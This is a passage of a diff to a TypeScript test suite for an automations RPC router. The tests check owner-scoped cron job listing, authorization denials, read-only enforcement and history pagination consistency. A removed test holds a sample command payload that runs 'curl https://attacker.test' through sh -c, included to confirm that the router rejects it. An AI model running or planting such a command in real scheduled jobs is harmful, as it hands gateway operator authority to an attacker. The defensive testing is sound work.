@@ -1,594 +1,318 @@
-import fs from "node:fs";
-import os from "node:os";
-import path from "node:path";
 import express from "express";
 import request from "supertest";
-import { afterEach, describe, expect, it, vi } from "vitest";
-import { acquireSystemConfigMutationLease } from "@octogee/core/system-config-mutation-lease";
+import { describe, expect, it, vi } from "vitest";
 import type { UpstreamRpcClient } from "../chat-proxy/openclaw/bridge-upstream-rpc.js";
+import { createAutomationsRouter, invokeLocalOpenClaw, NativeAutomationError, type LocalAutomationOpenClawDeps } from "./automations.js";
 
-import {
-  createAutomationsRouter,
-  invokeLocalOpenClaw,
-  type LocalAutomationOpenClawDeps,
-} from "./automations.js";
-
-const dirs: string[] = [];
-
-afterEach(() => {
-  for (const dir of dirs.splice(0)) fs.rmSync(dir, { recursive: true, force: true });
-});
-
-function appForTest(overrides: Partial<Parameters<typeof createAutomationsRouter>[0]> = {}) {
-  const openclawDir = fs.mkdtempSync(path.join(os.tmpdir(), "automations-route-"));
-  dirs.push(openclawDir);
-  const defaultInvoke = vi.fn(async (method: string) => {
-    if (method === "config.get") {
-      return {
-        hash: "config-hash",
-        config: {
-          agents: {
-            list: [{
-              id: "octogee-alice-coach",
-              heartbeat: { every: "30m", target: "last", directPolicy: "allow" },
-            }],
-          },
-        },
-      };
-    }
-    return { jobs: [] };
-  });
-  const invoke = overrides.invoke ?? defaultInvoke;
+const AGENT = "octogee-alice-coach";
+const CHANNEL = "a".repeat(26);
+const SESSION = `agent:${AGENT}:mattermost:channel:${CHANNEL}`;
+const OWNER = { agentId: AGENT, accountId: "alice-coach", sessionKey: SESSION };
+function job(extra: Record<string, unknown> = {}) {
+  return { id: "daily", name: "Daily digest", agentId: AGENT, effectiveAgentId: AGENT,
+    owner: OWNER, enabled: true, createdAtMs: 1, updatedAtMs: 2, configRevision: "revision-a",
+    schedule: { kind: "every", everyMs: 3_600_000, anchorMs: 50 },
+    sessionTarget: "isolated", wakeMode: "now", payload: { kind: "agentTurn", message: "Summarize." },
+    delivery: { mode: "none" }, state: { nextRunAtMs: 1000 }, ...extra };
+}
+const nativeJobs = [
+  job({ id: "heartbeat", owner: undefined, name: `heartbeat-${AGENT}`, declarationKey: `heartbeat:${AGENT}`, payload: { kind: "heartbeat" }, sessionTarget: "main", wakeMode: "next-heartbeat" }),
+  job({ id: "dreaming", owner: undefined, agentId: undefined, name: "Memory Dreaming Promotion", declarationKey: "memory-core:memory-dreaming-promotion", schedule: { kind: "cron", expr: "0 3 * * *", staggerMs: 0 }, payload: { kind: "agentTurn", message: "__openclaw_memory_core_short_term_promotion_dream__", lightContext: true } }),
+  job({ id: "skills", owner: undefined, enabled: false, declarationKey: `skill-collection-review:${AGENT}`, schedule: { kind: "every", everyMs: 604_800_000, anchorMs: 17 }, payload: { kind: "agentTurn", message: "Review the skill collection.", toolsAllow: ["read"] }, wakeMode: "next-heartbeat" }),
+];
+function page(jobs: Record<string, unknown>[], params: Record<string, unknown> = {}, revision = "snapshot-a") {
+  const offset = Number(params.offset ?? 0), limit = Number(params.limit ?? 200);
+  const rows = jobs.slice(offset, offset + limit), next = offset + rows.length;
+  return { jobs: rows, snapshotRevision: revision, total: jobs.length, offset, limit, hasMore: next < jobs.length, nextOffset: next < jobs.length ? next : null };
+}
+function historyPage(entries: Record<string, unknown>[], params: Record<string, unknown>) {
+  const offset = Number(params.offset ?? 0), limit = Number(params.limit ?? 200);
+  const rows = entries.slice(offset, offset + limit), next = offset + rows.length;
+  return { entries: rows, total: entries.length, offset, limit, hasMore: next < entries.length, nextOffset: next < entries.length ? next : null };
+}
+function appForTest(options: { jobs?: Record<string, unknown>[]; invoke?: (method: string, params: Record<string, unknown>) => Promise<unknown>; authorizeOwner?: Parameters<typeof createAutomationsRouter>[0]["authorizeOwner"] } = {}) {
+  const jobs = options.jobs ?? [job()];
+  const invoke = vi.fn(options.invoke ?? (async (method, params) => {
+    if (method === "cron.list") return page(jobs, params);
+    if (method === "cron.get") return jobs.find((row) => row.id === params.id);
+    if (method === "cron.status") return { enabled: true, triggersEnabled: false, jobs: 999, nextWakeAtMs: 1, storePath: "/private/shared" };
+    if (method === "cron.runs") return { entries: [], total: 0, offset: 0, limit: params.limit ?? 20, hasMore: false, nextOffset: null };
+    return { ok: true };
+  }));
+  const authorizeOwner = options.authorizeOwner ?? vi.fn(async () => ({ kind: "authorized" as const, slug: "alice", gatewayId: "gw-alice", coachChannelId: CHANNEL }));
   const app = express();
   app.use(express.json());
-  app.use((req, _res, next) => {
-    req.uid = "builder-uid";
-    next();
-  });
-  app.use(
-    "/api/g/:gatewayId/automations",
-    createAutomationsRouter({
-      authorizeOwner: async () => ({
-        kind: "authorized",
-        slug: "alice",
-        gatewayId: "gw-alice",
-        coachChannelId: "mm-coach-alice",
-      }),
-      localGatewayId: () => "gw-alice",
-      openclawDir: () => openclawDir,
-      invoke,
-      ...overrides,
-    }),
-  );
-  return { app, invoke, openclawDir };
+  app.use((req, res, next) => { req.uid = "builder-uid"; next(); });
+  app.use("/api/g/:gatewayId/automations", createAutomationsRouter({ authorizeOwner, localGatewayId: () => "gw-alice", invoke }));
+  app.use((error: Error, req: express.Request, res: express.Response, next: express.NextFunction) => { if (res.headersSent) { next(error); return; } res.status(500).json({ error: error.message }); });
+  return { app, invoke, authorizeOwner };
+}
+function rpc(app: express.Express, method: string, params: Record<string, unknown> = {}) {
+  return request(app).post("/api/g/gw-alice/automations/rpc").set("Authorization", "Bearer caller-token").send({ method, params });
 }
 
-describe("automations locality broker", () => {
-  it("forwards the Firebase bearer to the tenant-bound authorization broker before OpenClaw", async () => {
-    const authorizeOwner = vi.fn(async () => ({
-      kind: "authorized" as const,
-      slug: "alice",
-      gatewayId: "gw-alice",
-      coachChannelId: "mm-coach-alice",
-    }));
-    const { app } = appForTest({ authorizeOwner });
-
-    await request(app)
-      .post("/api/g/gw-alice/automations/rpc")
-      .set("Authorization", "Bearer caller-token")
-      .send({ method: "cron.list" })
-      .expect(200);
-
-    expect(authorizeOwner).toHaveBeenCalledWith({
-      gatewayId: "gw-alice",
-      authorization: "Bearer caller-token",
-      uid: "builder-uid",
-    });
-  });
-
-  it("does not invoke OpenClaw when the platform broker denies workspace ownership", async () => {
-    const { app, invoke } = appForTest({
-      authorizeOwner: vi.fn(async () => ({ kind: "forbidden" as const })),
-    });
-
-    const response = await request(app)
-      .post("/api/g/gw-alice/automations/rpc")
-      .set("Authorization", "Bearer caller-token")
-      .send({ method: "cron.list" });
-
-    expect(response.status).toBe(403);
-    expect(response.body).toEqual({ error: "forbidden" });
+describe("native Automations locality broker", () => {
+  it("authorizes the current workspace owner before returning trusted native context", async () => {
+    const { app, authorizeOwner, invoke } = appForTest();
+    const response = await rpc(app, "automations.context");
+    expect(response.status).toBe(200);
+    expect(response.body.result).toMatchObject({ agentId: AGENT, canManage: false, capabilities: { runTranscripts: false, scratch: false } });
+    expect(authorizeOwner).toHaveBeenCalledWith({ gatewayId: "gw-alice", uid: "builder-uid", authorization: "Bearer caller-token" });
     expect(invoke).not.toHaveBeenCalled();
   });
-
-  it("preserves the not-ready coach channel state without invoking OpenClaw", async () => {
-    const { app, invoke } = appForTest({
-      authorizeOwner: vi.fn(async () => ({ kind: "coach_channel_not_ready" as const })),
-    });
-
-    const response = await request(app)
-      .post("/api/g/gw-alice/automations/rpc")
-      .send({ method: "cron.list" });
-
+  it.each(["forbidden", "not_found", "coach_channel_not_ready", "unauthenticated"] as const)("does not call native RPC after authorization %s", async (kind) => {
+    const { app, invoke } = appForTest({ authorizeOwner: async () => ({ kind }) });
+    expect((await rpc(app, "cron.list")).status).toBe({ forbidden: 403, not_found: 404, coach_channel_not_ready: 409, unauthenticated: 401 }[kind]);
+    expect(invoke).not.toHaveBeenCalled();
+  });
+  it("returns all three native projected job shapes unchanged, with actual cadence and native metadata", async () => {
+    const { app } = appForTest({ jobs: nativeJobs });
+    const response = await rpc(app, "cron.list", { includeDisabled: true, limit: 20 });
+    expect(response.status).toBe(200);
+    expect(response.body.result).toMatchObject({ jobs: JSON.parse(JSON.stringify(nativeJobs)), total: 3, offset: 0, limit: 20, hasMore: false, nextOffset: null });
+    expect(response.body.result.snapshotRevision).toEqual(expect.any(String));
+    expect(response.body.result.hostedCapabilities.heartbeat).toEqual({ history: true });
+  });
+  it("enforces stamped owner and account independently of execution agent before pagination", async () => {
+    const foreign = job({ id: "foreign", owner: { agentId: "octogee-bob-coach", accountId: "bob-coach" } });
+    const account = job({ id: "account", owner: { agentId: AGENT, accountId: "bob-coach" } });
+    const retargeted = job({ id: "retargeted", agentId: "octogee-bob-coach", effectiveAgentId: "octogee-bob-coach" });
+    const { app } = appForTest({ jobs: [foreign, account, retargeted, job()] });
+    const response = await rpc(app, "cron.list", { limit: 1, offset: 1, includeDisabled: true });
+    expect(response.body.result).toMatchObject({ jobs: [job()], total: 2, offset: 1, limit: 1, hasMore: false });
+  });
+  it.each([
+    { label: "missing agent", owner: { accountId: OWNER.accountId, sessionKey: SESSION } },
+    { label: "missing account", owner: { agentId: AGENT, sessionKey: SESSION } },
+    { label: "missing session", owner: { agentId: AGENT, accountId: OWNER.accountId } },
+    { label: "non-Mattermost session", owner: { ...OWNER, sessionKey: `agent:${AGENT}:main` } },
+    { label: "foreign Mattermost session", owner: { ...OWNER, sessionKey: `agent:octogee-bob-coach:mattermost:channel:${CHANNEL}` } },
+    { label: "malformed Mattermost session", owner: { ...OWNER, sessionKey: `agent:${AGENT}:mattermost:channel:${CHANNEL}:foreign` } },
+  ])("hides $label authority from list, get, and history", async ({ owner }) => {
+    const { app, invoke } = appForTest({ jobs: [job({ owner })] });
+    const listed = await rpc(app, "cron.list");
+    expect(listed.status).toBe(200);
+    expect(listed.body.result).toMatchObject({ jobs: [], total: 0, hostedCapabilities: {} });
+    expect((await rpc(app, "cron.get", { id: "daily" })).status).toBe(404);
+    expect((await rpc(app, "cron.runs", { id: "daily" })).status).toBe(404);
+    expect(invoke.mock.calls.filter(([method]) => method !== "cron.list")).toEqual([]);
+  });
+  it.each(["agentId", "accountId", "sessionKey"])("rejects get if explicit owner %s disappears after inventory", async (field) => {
+    const owner: Record<string, unknown> = { ...OWNER };
+    delete owner[field];
+    const { app } = appForTest({ invoke: async (method, params) => method === "cron.list" ? page([job()], params) : job({ owner }) });
+    const response = await rpc(app, "cron.get", { id: "daily" });
     expect(response.status).toBe(409);
-    expect(response.body).toEqual({ error: "coach_channel_not_ready" });
+    expect(response.body).toEqual({ error: "automation_inventory_changed" });
+  });
+  it.each(["direct", "group", "channel"])("preserves explicitly owned Mattermost %s and thread authority", async (kind) => {
+    const rows = [job({ owner: { ...OWNER, sessionKey: `agent:${AGENT}:mattermost:${kind}:${CHANNEL}` } }),
+      job({ id: "thread", owner: { ...OWNER, sessionKey: `agent:${AGENT}:mattermost:${kind}:${CHANNEL}:thread:post-id` } })];
+    const { app } = appForTest({ jobs: rows });
+    expect((await rpc(app, "cron.list")).body.result.jobs).toEqual(rows);
+  });
+  it("never attributes arbitrary ownerless jobs or foreign-stamped system jobs by their execution target", async () => {
+    const { app } = appForTest({ jobs: [job({ owner: undefined }), { ...nativeJobs[0], owner: { agentId: "octogee-bob-coach" } }] });
+    expect((await rpc(app, "cron.list")).body.result.jobs).toEqual([]);
+  });
+  it.each([
+    { payload: { kind: "command", command: "env", env: { SECRET: "private" } } },
+    { payload: { kind: "script", script: "private" } },
+    { schedule: { kind: "on-exit", command: "private" } },
+    { scheduledToolPolicy: { version: 1, mode: "trusted" } },
+    { scheduledToolPolicy: { version: 1, mode: "account", ownerAccountId: "bob-coach", ownerSessionKey: SESSION } },
+    { scheduledToolPolicy: { version: 1, mode: "account", ownerAccountId: "alice-coach", ownerSessionKey: "agent:foreign:main" } },
+  ])("does not expose protected operator payloads or foreign scheduled authority %j", async (fields) => {
+    const { app } = appForTest({ jobs: [job(fields)] });
+    const response = await rpc(app, "cron.list");
+    expect(response.body.result.jobs).toEqual([]);
+  });
+  it("preserves the canonical account-bound scheduled policy without reattributing its owner", async () => {
+    const row = job({ scheduledToolPolicy: { version: 1, mode: "account", ownerAccountId: "alice-coach", ownerSessionKey: SESSION } });
+    const { app } = appForTest({ jobs: [row] });
+    expect((await rpc(app, "cron.list")).body.result.jobs).toEqual([row]);
+  });
+  it("fails explicitly on malformed native inventory instead of fabricating an empty page or heartbeat", async () => {
+    const { app } = appForTest({ invoke: async () => ({ jobs: [] }) });
+    const response = await rpc(app, "cron.list");
+    expect(response.status).toBe(502);
+    expect(response.body.error).toBe("invalid_native_automation_inventory");
+  });
+  it("fails explicitly when the native inventory exceeds its bounded scan", async () => {
+    const { app } = appForTest({ invoke: async () => ({ ...page([job()]), total: 2001, hasMore: true, nextOffset: 1 }) });
+    expect((await rpc(app, "cron.list")).body.error).toBe("automation_inventory_limit");
+  });
+  it("rejects a changing multi-page snapshot instead of mixing ownership generations", async () => {
+    let revision = 0;
+    const jobs = Array.from({ length: 201 }, (_, n) => job({ id: `j${n}` }));
+    const { app } = appForTest({ invoke: async (method, params) => page(jobs, params, `revision-${revision++}`) });
+    expect((await rpc(app, "cron.list")).body.error).toBe("automation_inventory_changed");
+  });
+  it("keeps scoped revisions and counts independent of foreign inventory rows", async () => {
+    let foreignName = "Bob's job";
+    const invoke = async (method: string, params: Record<string, unknown>) => page([job(), job({ id: "foreign", owner: { agentId: "bob" }, name: foreignName })], params, foreignName);
+    const { app } = appForTest({ invoke });
+    const first = (await rpc(app, "cron.list")).body.result;
+    foreignName = "Changed privately";
+    const second = (await rpc(app, "cron.list")).body.result;
+    expect(second.snapshotRevision).toBe(first.snapshotRevision);
+    expect(second.total).toBe(1);
+  });
+  it("rejects foreign client agent selectors before any native request", async () => {
+    const { app, invoke } = appForTest();
+    expect((await rpc(app, "cron.list", { agentId: "bob" })).status).toBe(400);
+    expect((await rpc(app, "cron.runs", { scope: "all", agentId: "bob" })).status).toBe(400);
     expect(invoke).not.toHaveBeenCalled();
   });
-
-  it("lists only cron jobs scoped to the authenticated Builder's coach", async () => {
+  it("refuses get when the native owner or definition changed since the scoped inventory", async () => {
+    const { app } = appForTest({ invoke: async (method, params) => method === "cron.list" ? page([job()], params) : job({ owner: { agentId: "bob" }, configRevision: "revision-b" }) });
+    const response = await rpc(app, "cron.get", { id: "daily" });
+    expect(response.status).toBe(409);
+    expect(response.body.error).toBe("automation_inventory_changed");
+    expect(response.body).not.toHaveProperty("result");
+  });
+  it("retains only bounded native conflict details at the HTTP boundary", async () => {
+    const { app } = appForTest({ invoke: async () => { throw new NativeAutomationError({ code: "INVALID_REQUEST", message: "Job changed", details: { code: "CRON_JOB_CHANGED", expectedConfigRevision: "old", actualConfigRevision: "new", privateState: "not public" } }); } });
+    const response = await rpc(app, "cron.list");
+    expect(response.status).toBe(409);
+    expect(response.body).toEqual({ error: "native_automation_error", code: "INVALID_REQUEST", message: "Job changed", details: { code: "CRON_JOB_CHANGED", expectedConfigRevision: "old", actualConfigRevision: "new" } });
+  });
+  it("derives status counts and next wake from owned native rows, without shared store metadata", async () => {
+    const { app } = appForTest();
+    const response = await rpc(app, "cron.status");
+    expect(response.body.result).toEqual({ enabled: true, triggersEnabled: false, jobs: 1, nextWakeAtMs: 1000 });
+  });
+  it.each(["cron.get", "cron.runs"])("rejects foreign ownership for %s before the target RPC", async (method) => {
+    const { app, invoke } = appForTest({ jobs: [job({ owner: { agentId: "octogee-bob-coach" } })] });
+    expect((await rpc(app, method, { id: "daily", ...(method === "cron.update" ? { patch: { enabled: false } } : {}) })).status).toBe(404);
+    expect(invoke.mock.calls.filter(([name]) => name !== "cron.list")).toEqual([]);
+  });
+  it("returns the full native get row for an owned job", async () => {
+    const { app } = appForTest();
+    expect((await rpc(app, "cron.get", { id: "daily" })).body.result).toEqual(job());
+  });
+  it.each(["config.get", "heartbeat.get", "heartbeat.update", "cron.scratch.get", "cron.history", "cron.migration"])("explicitly rejects unsupported %s without calling native", async (method) => {
     const { app, invoke } = appForTest();
-
-    const response = await request(app)
-      .post("/api/g/gw-alice/automations/rpc")
-      .send({ method: "cron.list", params: { includeDisabled: false } });
-
+    expect((await rpc(app, method, { id: "daily" })).status).toBe(400);
+    expect(invoke).not.toHaveBeenCalled();
+  });
+  it.each(["cron.add", "cron.update", "cron.run", "cron.remove"])("denies %s rather than lending unscoped operator authority", async (method) => {
+    const { app, invoke } = appForTest();
+    const response = await rpc(app, method, { id: "daily", expectedConfigRevision: "revision-a", patch: { enabled: false } });
+    expect(response.status).toBe(403);
+    expect(response.body.error).toBe("automation_read_only");
+    expect(invoke).not.toHaveBeenCalled();
+  });
+  it("advertises only authorized run-history capability", async () => {
+    const { app } = appForTest();
+    const response = await rpc(app, "cron.list");
+    expect(response.body.result.hostedCapabilities.daily).toEqual({ history: true });
+  });
+  it("keeps an owned retargeted job visible but excludes its foreign-execution history from overview", async () => {
+    const retargeted = job({ id: "retargeted", agentId: "octogee-bob-coach", effectiveAgentId: "octogee-bob-coach" });
+    const { app, invoke } = appForTest({ jobs: [job(), retargeted] });
+    expect((await rpc(app, "cron.list")).body.result.hostedCapabilities.retargeted.history).toBe(false);
+    expect((await rpc(app, "cron.runs", { scope: "all" })).status).toBe(200);
+    expect(invoke).not.toHaveBeenCalledWith("cron.runs", expect.objectContaining({ id: "retargeted" }));
+    expect((await rpc(app, "cron.runs", { id: "retargeted" })).status).toBe(403);
+  });
+  it("does not expose account-bound foreign policy through ownerless native projection names", async () => {
+    const { app } = appForTest({ jobs: [{ ...nativeJobs[0], scheduledToolPolicy: { version: 1, mode: "account", ownerAccountId: "bob-coach", ownerSessionKey: "agent:bob:main" } }] });
+    expect((await rpc(app, "cron.list")).body.result.jobs).toEqual([]);
+  });
+  it("reads durable agent-scoped history and intersects authorized jobs before paging", async () => {
+    const jobs = [job(), job({ id: "foreign", owner: { agentId: "foreign" } })];
+    const entry = { jobId: "daily", ts: 10, action: "finished", status: "ok", runId: "run-a", sessionKey: `agent:${AGENT}:cron:daily:run:run-a` };
+    const invoke = vi.fn(async (method: string, params: Record<string, unknown>) => method === "cron.list" ? page(jobs, params) : { entries: [entry], total: 1, offset: 0, limit: 200, hasMore: false, nextOffset: null });
+    const { app } = appForTest({ invoke });
+    const response = await rpc(app, "cron.runs", { scope: "all", limit: 10 });
     expect(response.status).toBe(200);
-    expect(response.body).toEqual({ result: { jobs: [] } });
-    expect(invoke).toHaveBeenCalledWith("cron.list", {
-      agentId: "octogee-alice-coach",
-      includeDisabled: true,
-      limit: 200,
-      sortBy: "updatedAtMs",
-      sortDir: "desc",
-    });
+    expect(response.body.result).toMatchObject({ entries: [entry], total: 1, offset: 0, hasMore: false, nextOffset: null });
+    expect(invoke).toHaveBeenCalledWith("cron.runs", expect.objectContaining({ scope: "all", agentId: AGENT }));
+    expect(invoke).not.toHaveBeenCalledWith("cron.runs", expect.objectContaining({ id: "foreign" }));
   });
 
-  it("projects cron listing responses to A2-safe agent-turn jobs", async () => {
-    const safeJob = {
-      id: "daily-digest",
-      agentId: "octogee-alice-coach",
-      name: "Daily digest",
-      enabled: true,
-      schedule: { kind: "every", everyMs: 60_000 },
-      sessionTarget: "isolated",
-      wakeMode: "now",
-      payload: { kind: "agentTurn", message: "Summarize the day." },
-      delivery: { mode: "webhook", to: "https://secret.example/hook" },
-      state: { nextRunAtMs: 1_783_820_800_000, lastRunStatus: "ok" },
-    };
-    const { app } = appForTest({
-      invoke: vi.fn(async (method: string) => {
-        if (method === "cron.list") {
-          return {
-            jobs: [
-              safeJob,
-              {
-                ...safeJob,
-                id: "morning-brief",
-                delivery: {
-                  mode: "announce",
-                  channel: "mattermost",
-                  accountId: "alice-coach",
-                  to: "channel:mm-coach-alice",
-                },
-              },
-              { ...safeJob, id: "legacy-command", payload: { kind: "command", argv: ["env"] } },
-            ],
-            deliveryPreviews: { "daily-digest": { detail: "https://secret.example/hook" } },
-          };
-        }
-        return { jobs: [] };
-      }),
-    });
-
-    const response = await request(app)
-      .post("/api/g/gw-alice/automations/rpc")
-      .send({ method: "cron.list" });
-
-    expect(response.body).toEqual({
-      result: {
-        jobs: [{
-          id: "daily-digest",
-          name: "Daily digest",
-          enabled: true,
-          schedule: { kind: "every", everyMs: 60_000 },
-          sessionTarget: "isolated",
-          wakeMode: "now",
-          payload: { kind: "agentTurn", message: "Summarize the day." },
-          delivery: { mode: "none" },
-          state: { nextRunAtMs: 1_783_820_800_000, lastRunStatus: "ok" },
-        }, {
-          id: "morning-brief",
-          name: "Daily digest",
-          enabled: true,
-          schedule: { kind: "every", everyMs: 60_000 },
-          sessionTarget: "isolated",
-          wakeMode: "now",
-          payload: { kind: "agentTurn", message: "Summarize the day." },
-          delivery: { mode: "announce", channel: "mattermost", to: "channel:coach" },
-          state: { nextRunAtMs: 1_783_820_800_000, lastRunStatus: "ok" },
-        }],
-      },
-    });
+  it("rejects same-total head insertion and tail retirement during history pagination", async () => {
+    const entries = Array.from({ length: 201 }, (_, n) => ({ jobId: "daily", ts: 201 - n, runId: `run-${n}` }));
+    const rotated = [{ jobId: "daily", ts: 202, runId: "new-head" }, ...entries.slice(0, -1)];
+    let reads = 0;
+    const { app, invoke } = appForTest({ invoke: async (method, params) => method === "cron.list" ? page([job()], params)
+      : historyPage(reads++ === 0 ? entries : rotated, params) });
+    const response = await rpc(app, "cron.runs", { scope: "all" });
+    expect(response.status).toBe(409);
+    expect(response.body).toEqual({ error: "automation_history_changed" });
+    expect(invoke.mock.calls.filter(([method]) => method === "cron.runs").length).toBeLessThanOrEqual(4);
   });
-
-  it.each(["cron.get", "cron.remove"])("rejects unsupported browser operation %s without invoking OpenClaw", async (method) => {
-    const { app, invoke } = appForTest();
-
-    const response = await request(app)
-      .post("/api/g/gw-alice/automations/rpc")
-      .send({ method, params: { id: "daily-digest" } });
-
-    expect(response.status).toBe(400);
-    expect(response.body).toEqual({ error: "unsupported automation operation" });
-    expect(invoke).not.toHaveBeenCalled();
+  it("verifies interior history pages even when the head and total remain unchanged", async () => {
+    const entries = Array.from({ length: 401 }, (_, n) => ({ jobId: "daily", ts: 401 - n, summary: `run ${n}` }));
+    const changed = entries.map((entry, n) => n === 250 ? { ...entry, summary: "Late delivery result" } : entry);
+    let reads = 0;
+    const { app } = appForTest({ invoke: async (method, params) => method === "cron.list" ? page([job()], params)
+      : historyPage(reads++ < 3 ? entries : changed, params) });
+    const response = await rpc(app, "cron.runs", { scope: "all" });
+    expect(response.status).toBe(409);
+    expect(response.body).toEqual({ error: "automation_history_changed" });
+    expect(reads).toBeLessThanOrEqual(6);
   });
-
-  it("rejects command payloads instead of lending the gateway's operator authority", async () => {
-    const { app, invoke } = appForTest();
-
-    const response = await request(app)
-      .post("/api/g/gw-alice/automations/rpc")
-      .send({
-        method: "cron.add",
-        params: {
-          name: "Take over the pod",
-          enabled: true,
-          schedule: { kind: "every", everyMs: 60_000 },
-          payload: { kind: "command", argv: ["sh", "-c", "curl https://attacker.test"] },
-        },
-      });
-
-    expect(response.status).toBe(400);
-    expect(invoke).not.toHaveBeenCalled();
-  });
-
-  it("forces new cron jobs onto the caller's coach with the A2 delivery contract", async () => {
-    const { app, invoke } = appForTest();
-
-    const response = await request(app)
-      .post("/api/g/gw-alice/automations/rpc")
-      .send({
-        method: "cron.add",
-        params: {
-          name: "Daily digest",
-          enabled: true,
-          schedule: { kind: "every", everyMs: 60_000 },
-          sessionTarget: "main",
-          wakeMode: "next-heartbeat",
-          payload: { kind: "agentTurn", message: "Summarize the day." },
-          delivery: { mode: "announce", channel: "slack", to: "#outside" },
-        },
-      });
-
+  it.each(["asc", "desc"])("preserves native %s ordering and sessionless history within a bounded verification pass", async (sortDir) => {
+    const entries = Array.from({ length: 2000 }, (_, n) => ({ jobId: "daily", ts: Math.floor(n / 2), summary: `sessionless ${n}` }));
+    if (sortDir === "desc") entries.reverse();
+    const { app, invoke } = appForTest({ invoke: async (method, params) => method === "cron.list" ? page([job()], params) : historyPage(entries, params) });
+    const response = await rpc(app, "cron.runs", { scope: "all", sortDir, offset: 1990, limit: 10 });
     expect(response.status).toBe(200);
-    expect(invoke).toHaveBeenCalledWith("cron.add", {
-      agentId: "octogee-alice-coach",
-      name: "Daily digest",
-      enabled: true,
-      schedule: { kind: "every", everyMs: 60_000 },
-      sessionTarget: "isolated",
-      wakeMode: "now",
-      payload: { kind: "agentTurn", message: "Summarize the day." },
-      delivery: {
-        mode: "announce",
-        channel: "mattermost",
-        accountId: "alice-coach",
-        to: "channel:mm-coach-alice",
-      },
-    });
+    expect(response.body.result).toMatchObject({ entries: entries.slice(1990), total: 2000, offset: 1990, hasMore: false, nextOffset: null });
+    const reads = invoke.mock.calls.filter(([method]) => method === "cron.runs");
+    expect(reads).toHaveLength(20);
+    expect(reads.every(([, params]) => params.scope === "all" && params.agentId === AGENT && params.sortDir === sortDir)).toBe(true);
   });
-
-  it("retargets delivery edits to the authoritative coach channel", async () => {
-    const current = {
-      id: "daily-digest",
-      agentId: "octogee-alice-coach",
-      name: "Daily digest",
-      enabled: true,
-      schedule: { kind: "every", everyMs: 60_000 },
-      payload: { kind: "agentTurn", message: "Summarize the day." },
-      delivery: { mode: "none" },
-    };
-    const { app, invoke } = appForTest({
-      authorizeOwner: vi.fn(async () => ({
-        kind: "authorized" as const,
-        slug: "alice",
-        gatewayId: "gw-alice",
-        coachChannelId: "mm-coach-broker",
-      })),
-      invoke: vi.fn(async (method: string) => method === "cron.get" ? { job: current } : { ok: true }),
-    });
-
-    const response = await request(app)
-      .post("/api/g/gw-alice/automations/rpc")
-      .send({
-        method: "cron.update",
-        params: {
-          id: "daily-digest",
-          patch: { delivery: { mode: "announce", channel: "slack", to: "#outside" } },
-        },
-      });
-
+  it("uses one atomic native read for a single history page", async () => {
+    const entries = [{ jobId: "daily", ts: 10, summary: "Sessionless failure" }];
+    const { app, invoke } = appForTest({ invoke: async (method, params) => method === "cron.list" ? page([job()], params) : historyPage(entries, params) });
+    const response = await rpc(app, "cron.runs", { id: "daily" });
     expect(response.status).toBe(200);
-    expect(invoke).toHaveBeenCalledWith("cron.update", {
-      id: "daily-digest",
-      patch: {
-        delivery: {
-          mode: "announce",
-          channel: "mattermost",
-          accountId: "alice-coach",
-          to: "channel:mm-coach-broker",
-        },
-      },
-    });
+    expect(response.body.result.entries).toEqual(entries);
+    expect(invoke.mock.calls.filter(([method]) => method === "cron.runs")).toHaveLength(1);
   });
 
-  it("refuses operations on a cron job outside the caller's coach", async () => {
-    const { app, invoke } = appForTest({
-      invoke: vi.fn(async (method: string) => {
-        if (method === "cron.get") return { job: { id: "foreign-job", agentId: "another-agent" } };
-        return { ok: true };
-      }),
-    });
-
-    const response = await request(app)
-      .post("/api/g/gw-alice/automations/rpc")
-      .send({ method: "cron.run", params: { id: "foreign-job", mode: "force" } });
-
-    expect(response.status).toBe(404);
-    expect(invoke).toHaveBeenCalledWith("cron.get", { id: "foreign-job" });
-    expect(invoke).not.toHaveBeenCalledWith("cron.run", expect.anything());
+  it("refuses an inconsistent foreign-session entry returned by the native agent-scoped history", async () => {
+    const { app } = appForTest({ invoke: async (method, params) => method === "cron.list" ? page([job()], params) : { entries: [{ jobId: "daily", ts: 10, sessionKey: "agent:foreign:cron:daily" }], total: 1, offset: 0, limit: 200, hasMore: false, nextOffset: null } });
+    const response = await rpc(app, "cron.runs", { id: "daily" });
+    expect(response.status).toBe(502);
+    expect(response.body.error).toBe("invalid_native_automation_history");
   });
-
-  it("refuses to rewrite an unsupported existing job into an agent turn", async () => {
-    const { app, invoke } = appForTest({
-      invoke: vi.fn(async (method: string) => {
-        if (method === "cron.get") {
-          return {
-            job: {
-              id: "legacy-command",
-              agentId: "octogee-alice-coach",
-              payload: { kind: "command", argv: ["echo", "legacy"] },
-            },
-          };
-        }
-        return { ok: true };
-      }),
-    });
-
-    const response = await request(app)
-      .post("/api/g/gw-alice/automations/rpc")
-      .send({
-        method: "cron.update",
-        params: {
-          id: "legacy-command",
-          patch: { payload: { kind: "agentTurn", message: "A new prompt" } },
-        },
-      });
-
-    expect(response.status).toBe(404);
-    expect(invoke).not.toHaveBeenCalledWith("cron.update", expect.anything());
-  });
-
-  it("refuses a mismatched gateway before it can reach OpenClaw", async () => {
-    const { app, invoke } = appForTest();
-
-    const response = await request(app)
-      .post("/api/g/gw-someone-else/automations/rpc")
-      .send({ method: "cron.list" });
-
-    expect(response.status).toBe(404);
-    expect(invoke).not.toHaveBeenCalled();
-  });
-
-  it("does not turn the Automations surface into an arbitrary gateway RPC proxy", async () => {
-    const { app, invoke } = appForTest();
-
-    const response = await request(app)
-      .post("/api/g/gw-alice/automations/rpc")
-      .send({ method: "config.patch", params: { raw: "{}" } });
-
-    expect(response.status).toBe(400);
-    expect(invoke).not.toHaveBeenCalled();
-  });
-
-  it("reads the caller's coach heartbeat from its hash-bound config snapshot", async () => {
-    const { app, invoke } = appForTest();
-
-    const response = await request(app)
-      .post("/api/g/gw-alice/automations/rpc")
-      .send({ method: "heartbeat.get" });
-
-    expect(response.status).toBe(200);
-    expect(response.body).toEqual({
-      result: {
-        hash: "config-hash",
-        heartbeat: { every: "30m", target: "last" },
-      },
-    });
-    expect(invoke).toHaveBeenCalledWith("config.get", {});
-  });
-
-  it("hash-CAS patches only the caller's coach heartbeat and deletes stale fields", async () => {
-    const invoke = vi.fn(async (method: string) => {
-      if (method === "config.get") {
-        return {
-          hash: "before-hash",
-          config: {
-            agents: {
-              list: [{
-                id: "octogee-alice-coach",
-                heartbeat: {
-                  every: "30m",
-                  model: "attacker/model",
-                  directPolicy: "allow",
-                  futureSensitiveField: "stale",
-                },
-              }],
-            },
-          },
-        };
-      }
-      return { ok: true, hash: "next-hash" };
+  it.each(["all", "job"])("scopes %s history by durable execution agent after a job is retargeted and returned", async (scope) => {
